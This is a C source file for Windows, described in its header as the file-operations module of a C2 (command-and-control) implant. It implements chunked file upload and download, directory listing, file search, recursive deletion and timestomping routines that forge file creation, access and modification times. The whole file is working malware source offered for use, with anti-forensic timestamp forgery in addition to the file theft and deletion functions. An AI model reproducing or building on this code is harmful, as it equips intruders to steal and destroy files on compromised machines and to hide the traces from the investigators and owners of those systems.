/*
 * File Operations - Upload/Download/Dir for C2
 * Chunked transfer, timestomping patterns
 */

#include <windows.h>

// ============================================================================
// FILE CHUNK - For large transfers
// ============================================================================

#define CHUNK_SZ 0x100000  // 1MB

#pragma pack(push,1)
typedef struct {
    DWORD status;
    DWORD file_sz;
    DWORD chunk_num;
    DWORD total_chunks;
    BYTE  data[];
} FILE_CHUNK;

typedef struct {
    char  name[260];
    BYTE  type;          // 'f' or 'd'
    DWORD sz_low;
    DWORD sz_high;
    DWORD attr;
    FILETIME mtime;
} DIR_ENTRY;
#pragma pack(pop)

// ============================================================================
// READ FILE - Complete
// ============================================================================

BOOL file_read(char* path, BYTE** data, DWORD* len)
{
    HANDLE h = CreateFileA(path, 0x80000000, 1, 0, 3, 0, 0);
    if(h == INVALID_HANDLE_VALUE) {
        *data = 0;
        *len = 0;
        return 0;
    }

    *len = GetFileSize(h, 0);
    *data = HeapAlloc(GetProcessHeap(), 0, *len);

    DWORD rd;
    ReadFile(h, *data, *len, &rd, 0);
    CloseHandle(h);
    return 1;
}

// ============================================================================
// READ CHUNK - For large files
// ============================================================================

BOOL file_read_chunk(char* path, DWORD num, FILE_CHUNK** chunk, DWORD* clen)
{
    HANDLE h = CreateFileA(path, 0x80000000, 1, 0, 3, 0, 0);
    if(h == INVALID_HANDLE_VALUE)
        return 0;

    DWORD fsz = GetFileSize(h, 0);
    DWORD total = (fsz + CHUNK_SZ - 1) / CHUNK_SZ;
    DWORD off = num * CHUNK_SZ;
    DWORD toread = (off + CHUNK_SZ > fsz) ? fsz - off : CHUNK_SZ;

    if(off >= fsz) {
        CloseHandle(h);
        return 0;
    }

    *chunk = HeapAlloc(GetProcessHeap(), 0, sizeof(FILE_CHUNK) + toread);
    (*chunk)->status = 0;
    (*chunk)->file_sz = fsz;
    (*chunk)->chunk_num = num;
    (*chunk)->total_chunks = total;

    SetFilePointer(h, off, 0, 0);
    ReadFile(h, (*chunk)->data, toread, clen, 0);
    *clen += sizeof(FILE_CHUNK);

    CloseHandle(h);
    return 1;
}

// ============================================================================
// WRITE FILE
// ============================================================================

BOOL file_write(char* path, BYTE* data, DWORD len, BOOL append)
{
    HANDLE h = CreateFileA(path, 0x40000000, 0, 0,
        append ? 4 : 2, 0x80, 0);  // OPEN_ALWAYS : CREATE_ALWAYS
    if(h == INVALID_HANDLE_VALUE)
        return 0;

    if(append)
        SetFilePointer(h, 0, 0, 2);  // FILE_END

    DWORD wr;
    BOOL ret = WriteFile(h, data, len, &wr, 0);
    CloseHandle(h);
    return ret && (wr == len);
}

BOOL file_write_chunk(char* path, DWORD num, BYTE* data, DWORD len)
{
    HANDLE h = CreateFileA(path, 0x40000000, 0, 0,
        num == 0 ? 2 : 3, 0x80, 0);
    if(h == INVALID_HANDLE_VALUE)
        return 0;

    SetFilePointer(h, num * CHUNK_SZ, 0, 0);

    DWORD wr;
    BOOL ret = WriteFile(h, data, len, &wr, 0);
    CloseHandle(h);
    return ret;
}

// ============================================================================
// DIRECTORY LISTING
// ============================================================================

DWORD dir_list(char* path, DIR_ENTRY** entries)
{
    char search[260];
    wsprintfA(search, "%s\\*", path);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(search, &fd);
    if(h == INVALID_HANDLE_VALUE)
        return 0;

    // Count
    int cnt = 0;
    do { cnt++; } while(FindNextFileA(h, &fd));
    FindClose(h);

    *entries = HeapAlloc(GetProcessHeap(), 0, cnt * sizeof(DIR_ENTRY));

    h = FindFirstFileA(search, &fd);
    int i = 0;

    do {
        lstrcpyA((*entries)[i].name, fd.cFileName);
        (*entries)[i].type = (fd.dwFileAttributes & 0x10) ? 'd' : 'f';
        (*entries)[i].sz_low = fd.nFileSizeLow;
        (*entries)[i].sz_high = fd.nFileSizeHigh;
        (*entries)[i].attr = fd.dwFileAttributes;
        (*entries)[i].mtime = fd.ftLastWriteTime;
        i++;
    } while(FindNextFileA(h, &fd));

    FindClose(h);
    return cnt;
}

char* dir_list_fmt(char* path)
{
    static char buf[0x10000];
    int pos = 0;

    DIR_ENTRY* entries;
    DWORD cnt = dir_list(path, &entries);

    for(DWORD i = 0; i < cnt && pos < 0xFF00; i++) {
        SYSTEMTIME st;
        FileTimeToSystemTime(&entries[i].mtime, &st);
        ULONGLONG sz = ((ULONGLONG)entries[i].sz_high << 32) | entries[i].sz_low;

        if(entries[i].type == 'd') {
            pos += wsprintfA(buf + pos, "%04d-%02d-%02d %02d:%02d <DIR> %s\n",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute,
                entries[i].name);
        } else {
            pos += wsprintfA(buf + pos, "%04d-%02d-%02d %02d:%02d %I64u %s\n",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute,
                sz, entries[i].name);
        }
    }

    HeapFree(GetProcessHeap(), 0, entries);
    return buf;
}

// ============================================================================
// FILE OPS
// ============================================================================

BOOL file_del(char* path)
{
    if(DeleteFileA(path))
        return 1;

    // Remove read-only
    DWORD attr = GetFileAttributesA(path);
    if(attr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesA(path, attr & ~1);  // ~FILE_ATTRIBUTE_READONLY
        return DeleteFileA(path);
    }
    return 0;
}

BOOL file_move(char* src, char* dst)
{
    return MoveFileExA(src, dst, 3);  // REPLACE_EXISTING | COPY_ALLOWED
}

BOOL file_copy(char* src, char* dst)
{
    return CopyFileA(src, dst, 0);
}

BOOL dir_create(char* path)
{
    return CreateDirectoryA(path, 0) || GetLastError() == 183;  // ALREADY_EXISTS
}

BOOL dir_del(char* path)
{
    return RemoveDirectoryA(path);
}

// ============================================================================
// RECURSIVE DELETE
// ============================================================================

BOOL dir_del_r(char* path)
{
    char search[260];
    wsprintfA(search, "%s\\*", path);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(search, &fd);
    if(h == INVALID_HANDLE_VALUE)
        return RemoveDirectoryA(path);

    do {
        if(fd.cFileName[0] == '.' &&
           (fd.cFileName[1] == 0 || (fd.cFileName[1] == '.' && fd.cFileName[2] == 0)))
            continue;

        char full[260];
        wsprintfA(full, "%s\\%s", path, fd.cFileName);

        if(fd.dwFileAttributes & 0x10)
            dir_del_r(full);
        else
            file_del(full);
    } while(FindNextFileA(h, &fd));

    FindClose(h);
    return RemoveDirectoryA(path);
}

// ============================================================================
// FILE SEARCH
// ============================================================================

typedef BOOL (*FILE_CB)(char*, WIN32_FIND_DATAA*, void*);

void file_search(char* path, char* pattern, BOOL recurse, FILE_CB cb, void* ctx)
{
    char search[260];
    wsprintfA(search, "%s\\%s", path, pattern);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(search, &fd);
    if(h != INVALID_HANDLE_VALUE) {
        do {
            if(!(fd.dwFileAttributes & 0x10)) {
                char full[260];
                wsprintfA(full, "%s\\%s", path, fd.cFileName);
                if(!cb(full, &fd, ctx))
                    break;
            }
        } while(FindNextFileA(h, &fd));
        FindClose(h);
    }

    if(recurse) {
        wsprintfA(search, "%s\\*", path);
        h = FindFirstFileA(search, &fd);
        if(h != INVALID_HANDLE_VALUE) {
            do {
                if((fd.dwFileAttributes & 0x10) &&
                   fd.cFileName[0] != '.') {
                    char sub[260];
                    wsprintfA(sub, "%s\\%s", path, fd.cFileName);
                    file_search(sub, pattern, 1, cb, ctx);
                }
            } while(FindNextFileA(h, &fd));
            FindClose(h);
        }
    }
}

// ============================================================================
// TIMESTOMPING
// ============================================================================

BOOL file_stomp(char* path, FILETIME* c, FILETIME* a, FILETIME* m)
{
    HANDLE h = CreateFileA(path, 0x100, 3, 0, 3, 0, 0);  // FILE_WRITE_ATTRIBUTES
    if(h == INVALID_HANDLE_VALUE)
        return 0;

    BOOL ret = SetFileTime(h, c, a, m);
    CloseHandle(h);
    return ret;
}

BOOL file_stomp_copy(char* src, char* dst)
{
    HANDLE h = CreateFileA(src, 0x80000000, 1, 0, 3, 0, 0);
    if(h == INVALID_HANDLE_VALUE)
        return 0;

    FILETIME c, a, m;
    GetFileTime(h, &c, &a, &m);
    CloseHandle(h);

    return file_stomp(dst, &c, &a, &m);
}

// Touch to current time
BOOL file_touch(char* path)
{
    SYSTEMTIME st;
    FILETIME ft;
    GetSystemTime(&st);
    SystemTimeToFileTime(&st, &ft);
    return file_stomp(path, &ft, &ft, &ft);
}

// ============================================================================
// FILE INFO
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD sz_low;
    DWORD sz_high;
    DWORD attr;
    FILETIME ctime;
    FILETIME atime;
    FILETIME mtime;
} FILE_INFO;
#pragma pack(pop)

BOOL file_info(char* path, FILE_INFO* info)
{
    WIN32_FILE_ATTRIBUTE_DATA data;
    if(!GetFileAttributesExA(path, 0, &data))
        return 0;

    info->sz_low = data.nFileSizeLow;
    info->sz_high = data.nFileSizeHigh;
    info->attr = data.dwFileAttributes;
    info->ctime = data.ftCreationTime;
    info->atime = data.ftLastAccessTime;
    info->mtime = data.ftLastWriteTime;
    return 1;
}

// ============================================================================
// EOF
// ============================================================================
